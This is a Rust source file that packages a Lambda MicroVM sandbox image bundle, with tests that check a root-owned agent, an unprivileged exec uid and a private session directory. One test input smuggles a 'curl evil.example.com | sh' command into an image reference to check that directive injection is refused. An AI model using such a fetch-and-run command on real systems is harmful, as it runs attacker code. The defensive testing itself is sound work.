//! The bundle a Lambda MicroVM image is built from.
//!
//! AWS builds a MicroVM image from a zip containing a Dockerfile, not from a container image
//! reference, so a declared `code.image` has to be turned into one. That is Alien's packaging
//! problem, not something a user should have to express.
//!
//! The layout is the whole security story of the image: where the agent sits, who owns it, and
//! who the untrusted code runs as.

use std::fs::File;
use std::io::Write;
use std::path::Path;

use crate::error::{ErrorData, Result};
use alien_error::AlienError;
use alien_error::{Context, IntoAlienError};

use zip::write::SimpleFileOptions;
use zip::ZipWriter;

/// Path the agent binary is installed at inside the image.
pub const AGENT_PATH: &str = "/usr/local/bin/alien-sandbox-agent";

/// Directory a session's files live under, and the only place the untrusted uid can write.
pub const SESSION_ROOT: &str = "/sandbox";

/// Unprivileged uid and gid commands run as. Never the agent's own — a command running as the
/// agent could rewrite the agent.
pub const EXEC_UID: u32 = 60000;

/// Port the agent serves, both its protocol and the image's lifecycle hooks.
pub use alien_core::sandbox_process::AGENT_PORT;

/// Name the agent binary must have inside the bundle.
pub const AGENT_FILENAME: &str = "alien-sandbox-agent";

/// Renders the Dockerfile for a sandbox image built on `base_image`.
///
/// The agent runs as root so it can drop to [`EXEC_UID`] before every spawn; inside a MicroVM
/// that is contained by hardware virtualisation, which is the tenant boundary. A shared-kernel
/// backend must give the agent `CAP_SETUID` instead of root.
pub fn dockerfile(base_image: &str) -> Result<String> {
    // Checked here rather than by the callers: this is the one place the value crosses into
    // generated content, and a reference carrying a newline writes its own Dockerfile directives.
    if base_image.is_empty()
        || base_image
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err(AlienError::new(ErrorData::BuildConfigInvalid {
            message: format!("base image reference '{base_image}' is not a valid image reference"),
        }));
    }

    Ok(format!(
        r#"FROM {base_image}

# Root-owned and not writable by the exec uid: the untrusted code the agent supervises must not
# be able to rewrite the supervisor.
COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} {AGENT_PATH}

# Written with numeric ids and a plain append rather than useradd/adduser, which differ across
# base distributions. Linux runs a process under a uid with no passwd entry, but some tooling
# inside the sandbox reads one.
RUN printf 'sandbox:x:{EXEC_UID}:{EXEC_UID}::{SESSION_ROOT}:/sbin/nologin\n' >> /etc/passwd \
 && printf 'sandbox:x:{EXEC_UID}:\n' >> /etc/group \
 && mkdir -p {SESSION_ROOT} \
 && chown {EXEC_UID}:{EXEC_UID} {SESSION_ROOT} \
 && chmod 0700 {SESSION_ROOT}

# The full contract, in the image rather than only in the template. The ready hook runs during
# the image build, and the agent refuses to start without every one of these — so a value
# supplied only at run time leaves the build waiting on an agent that never came up.
ENV ALIEN_SANDBOX_ROOT={SESSION_ROOT} \
    ALIEN_SANDBOX_PORT={AGENT_PORT} \
    ALIEN_SANDBOX_AUTHORIZATION=transport \
    ALIEN_SANDBOX_EXEC_UID={EXEC_UID} \
    ALIEN_SANDBOX_EXEC_GID={EXEC_UID}

EXPOSE {AGENT_PORT}
ENTRYPOINT ["{AGENT_PATH}"]
"#
    ))
}

/// Writes the bundle AWS builds a MicroVM image from: the rendered Dockerfile and the agent
/// binary beside it, zipped.
///
/// The archive is flat on purpose — `CreateMicrovmImage` looks for the Dockerfile at the root,
/// and a nested directory produces a build failure minutes in rather than a rejected request.
pub fn write_bundle(destination: &Path, base_image: &str, agent_binary: &Path) -> Result<()> {
    let failed = |operation: &str, path: &Path| ErrorData::FileOperationFailed {
        operation: operation.to_string(),
        file_path: path.display().to_string(),
        reason: "could not assemble the sandbox image bundle".to_string(),
    };

    let agent = std::fs::read(agent_binary)
        .into_alien_error()
        .context(failed("read", agent_binary))?;
    let archive = File::create(destination)
        .into_alien_error()
        .context(failed("create", destination))?;
    let mut zip = ZipWriter::new(archive);

    // 0755 on the agent so the entry is already executable; the Dockerfile's `--chmod` covers
    // builders that drop archive modes, and neither alone is reliable across both.
    let options: SimpleFileOptions = SimpleFileOptions::default().unix_permissions(0o755);
    zip.start_file(AGENT_FILENAME, options)
        .into_alien_error()
        .context(failed("write", destination))?;
    zip.write_all(&agent)
        .into_alien_error()
        .context(failed("write", destination))?;

    zip.start_file(
        "Dockerfile",
        SimpleFileOptions::default().unix_permissions(0o644),
    )
    .into_alien_error()
    .context(failed("write", destination))?;
    zip.write_all(dockerfile(base_image)?.as_bytes())
        .into_alien_error()
        .context(failed("write", destination))?;

    zip.finish()
        .into_alien_error()
        .context(failed("finalize", destination))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    /// The reference reaches a generated Dockerfile, so a newline in it writes directives of the
    /// caller's choosing. Both entry points render through `dockerfile`, so the refusal is here.
    #[test]
    fn an_image_reference_that_would_inject_directives_is_refused() {
        for reference in [
            "alpine\nRUN curl evil.example.com | sh",
            "alpine:3 \nFROM scratch",
            "",
            "alpine\tlatest",
        ] {
            super::dockerfile(reference)
                .expect_err(&format!("{reference:?} must not render into a Dockerfile"));
        }

        // The control arm: an ordinary reference still renders, so the guard is not refusing
        // everything.
        let rendered = super::dockerfile("public.ecr.aws/lambda/microvms:al2023-minimal")
            .expect("an ordinary reference renders");
        assert!(rendered.starts_with("FROM public.ecr.aws/lambda/microvms:al2023-minimal"));
    }

    use super::*;

    /// The properties below are the image's half of the supervisor boundary. A base image is
    /// caller-supplied, so these assertions are about what Alien adds on top of it.
    fn rendered() -> String {
        dockerfile("public.ecr.aws/lambda/microvms:al2023-minimal").expect("a valid reference")
    }

    #[test]
    fn the_base_image_is_the_one_asked_for() {
        assert!(rendered().starts_with("FROM public.ecr.aws/lambda/microvms:al2023-minimal\n"));
    }

    /// The escalation this prevents: untrusted code running as the exec uid overwriting the
    /// agent binary and answering in its place.
    #[test]
    fn the_agent_binary_is_root_owned_and_not_writable_by_the_exec_uid() {
        let dockerfile = rendered();
        assert!(
            dockerfile.contains(&format!(
                "COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} {AGENT_PATH}"
            )),
            "the agent must be root-owned and mode 0755:\n{dockerfile}"
        );
    }

    /// 0700 and owned by the exec uid: the session's own files are readable only by the code
    /// that created them, not by anything else the base image happens to run.
    #[test]
    fn the_session_root_belongs_to_the_exec_uid_alone() {
        let dockerfile = rendered();
        assert!(dockerfile.contains(&format!("chown {EXEC_UID}:{EXEC_UID} {SESSION_ROOT}")));
        assert!(dockerfile.contains(&format!("chmod 0700 {SESSION_ROOT}")));
    }

    /// The agent refuses to start without these, so an image that omits them is a sandbox that
    /// never runs. Baking them in means the template and the image cannot disagree.
    #[test]
    fn the_agent_contract_is_baked_into_the_image() {
        let dockerfile = rendered();
        for expected in [
            &format!("ALIEN_SANDBOX_ROOT={SESSION_ROOT}"),
            &format!("ALIEN_SANDBOX_EXEC_UID={EXEC_UID}"),
            &format!("ALIEN_SANDBOX_EXEC_GID={EXEC_UID}"),
            &"ALIEN_SANDBOX_AUTHORIZATION=transport".to_string(),
        ] {
            assert!(dockerfile.contains(expected.as_str()), "missing {expected}");
        }
    }

    /// A shell would re-parse the path and give the sandbox a process it did not ask for.
    #[test]
    fn the_entrypoint_is_exec_form() {
        assert!(rendered().contains(&format!(r#"ENTRYPOINT ["{AGENT_PATH}"]"#)));
    }

    /// The uid the image creates and the uid the agent is told to use are the same number in
    /// three places — the image, the Terraform emitter and the CloudFormation emitter. This
    /// pins the one the other two are asserted against.
    #[test]
    fn the_exec_uid_is_unprivileged() {
        assert_ne!(EXEC_UID, 0, "the exec uid must never be root");
        assert_eq!(EXEC_UID, 60000);
        assert_eq!(AGENT_PORT, 8971);
    }

    /// The archive has to be flat and contain both entries: `CreateMicrovmImage` looks for the
    /// Dockerfile at the root, and a nested layout fails minutes into a build instead of being
    /// rejected up front.
    #[test]
    fn the_bundle_is_flat_and_carries_both_entries() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"\x7fELF-not-really").expect("agent");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(&bundle, "ubuntu:24.04", &agent).expect("writes the bundle");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("reads as a zip");

        let mut names: Vec<String> = (0..archive.len())
            .map(|i| archive.by_index(i).expect("entry").name().to_string())
            .collect();
        names.sort();
        assert_eq!(names, vec!["Dockerfile", AGENT_FILENAME]);

        for name in &names {
            assert!(
                !name.contains('/'),
                "the archive must be flat, found '{name}'"
            );
        }

        let mut dockerfile_entry = archive.by_name("Dockerfile").expect("Dockerfile entry");
        let mut contents = String::new();
        std::io::Read::read_to_string(&mut dockerfile_entry, &mut contents).expect("reads");
        assert!(contents.starts_with("FROM ubuntu:24.04"));
    }

    /// The agent entry must survive as an executable. A builder that honours archive modes and
    /// one that does not both have to produce a runnable binary, which is why the Dockerfile
    /// also carries `--chmod`.
    #[test]
    fn the_agent_entry_is_executable() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"binary").expect("agent");
        let bundle = dir.path().join("sandbox.zip");
        write_bundle(&bundle, "ubuntu:24.04", &agent).expect("writes");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("zip");
        let entry = archive.by_name(AGENT_FILENAME).expect("agent entry");
        assert_eq!(
            entry.unix_mode().map(|mode| mode & 0o777),
            Some(0o755),
            "the agent entry must be executable in the archive"
        );
    }
}
